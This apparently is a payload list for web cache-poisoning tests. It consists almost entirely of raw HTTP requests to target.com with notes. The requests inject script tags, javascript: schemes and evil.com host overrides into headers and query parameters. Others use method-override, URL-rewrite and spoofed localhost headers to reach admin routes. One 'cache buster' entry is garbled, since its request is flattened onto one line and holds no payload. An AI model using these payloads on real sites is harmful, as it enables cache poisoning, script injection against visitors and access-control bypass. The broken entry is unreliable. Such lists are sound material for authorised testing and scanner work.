payload:
GET /api/data HTTP/1.1
Host: target.com
X-Forwarded-Proto: https
X-Forwarded-Proto: http
notes: Duplicate X-Forwarded-Proto header to poison cache key

payload:
GET /api/data HTTP/1.1
Host: target.com
X-FORWARDED-PROTO: javascript:alert(1)
notes: Case variation of X-Forwarded-Proto with malicious value

payload:
GET /api/data HTTP/1.1
Host: target.com
Accept-Encoding: gzip
Accept-Encoding: identity, <script>alert(1)</script>
notes: Duplicate Accept-Encoding with XSS payload

payload:
GET /api/data HTTP/1.1
Host: target.com
X-Original-URL: /admin/delete
notes: X-Original-URL unkeyed header to poison cache with different route

payload:
GET /api/data HTTP/1.1
Host: target.com
X-Rewrite-URL: /../admin
notes: X-Rewrite-URL with path traversal

payload:
GET /api/data?callback=alert(1) HTTP/1.1
Host: target.com
notes: JSONP callback parameter with XSS payload

payload:
GET /api/data HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
notes: X-Forwarded-Host poisoning to inject evil domain

payload:
GET /api/data HTTP/1.1
Host: target.com
X-Forwarded-Scheme: javascript
notes: X-Forwarded-Scheme with javascript protocol

payload:
GET /api/data HTTP/1.1
Host: target.com
X-HTTP-Method-Override: DELETE
notes: Method override header to poison cache with DELETE semantics

payload:
GET /api/data HTTP/1.1
Host: target.com
X-Method-Override: PUT
notes: X-Method-Override to change cached method semantics

payload:
GET /api/data?utm_content=<script>alert(1)</script> HTTP/1.1
Host: target.com
notes: UTM parameter with XSS payload (often unkeyed)

payload:
GET /api/data HTTP/1.1
Host: target.com
Translate: <script>alert(1)</script>
notes: Translate header (WebDAV) with XSS payload

payload:
GET /api/data HTTP/1.1
Host: target.com
X-Forwarded-Prefix: /xss'><script>alert(1)</script>
notes: X-Forwarded-Prefix with XSS payload

payload:
GET /api/data HTTP/1.1
Host: target.com
X-Custom-IP-Authorization: 127.0.0.1
notes: Custom IP authorization header to poison cache with admin access

payload: GET /api/data?_= HTTP/1.1 Host: target.com
notes: Cache buster parameter with XSS payload

payload:
GET /api/data HTTP/1.1
Host: target.com
X-Forwarded-Port: 8080<script>alert(1)</script>
notes: X-Forwarded-Port with XSS payload

payload:
GET /api/data HTTP/1.1
Host: target.com
Accept-Language: en-US<script>alert(1)</script>
notes: Accept-Language with XSS payload (sometimes unkeyed)

payload:
GET /api/data?version=1.0&version=<script>alert(1)</script> HTTP/1.1
Host: target.com
notes: Duplicate query parameters with XSS in second occurrence

payload:
GET /api/data HTTP/1.1
Host: target.com
X-Amz-Website-Redirect-Location: javascript:alert(1)
notes: AWS S3 redirect header with javascript protocol

payload:
GET /api/data HTTP/1.1
Host: target.com
X-Original-Url: /admin
X-Rewrite-Url: /public
notes: Conflicting URL rewrite headers to confuse cache/origin

payload:
GET /api/data HTTP/1.1
Host: target.com
X-Forwarded-Proto: http
X-Forwarded-Ssl: on
notes: Conflicting protocol headers (http vs SSL on)

payload:
GET /api/data?callback=jQuery<script>alert(1)</script> HTTP/1.1
Host: target.com
notes: JSONP callback with injected script tags

payload:
GET /api/data HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0<script>alert(1)</script>
notes: User-Agent header with XSS payload (if used in cache key)

payload:
GET /api/data HTTP/1.1
Host: target.com
Referer: https://evil.com/<script>alert(1)</script>
notes: Referer header with XSS payload

payload:
GET /api/data?%3Finjected=1 HTTP/1.1
Host: target.com
notes: URL-encoded question mark to inject extra query parameters

payload:
GET /api/data?utm_source=test&%26injected=<script>alert(1)</script> HTTP/1.1
Host: target.com
notes: URL-encoded ampersand to inject parameter after cache key calculation

payload:
GET /api/data HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1, <script>alert(1)</script>
notes: X-Forwarded-For with XSS payload after valid IP

payload:
GET /api/data HTTP/1.1
Host: target.com
Cookie: session=abc123; injected=<script>alert(1)</script>
notes: Cookie with XSS payload (if cookies included in cache key)

payload:
GET /api/data HTTP/1.1
Host: target.com
X-Edge-Location: <script>alert(1)</script>
notes: CDN-specific header with XSS payload

payload:
GET /api/data HTTP/1.1
Host: target.com
X-Host: evil.com:80@target.com
notes: X-Host header with credential-style host confusion
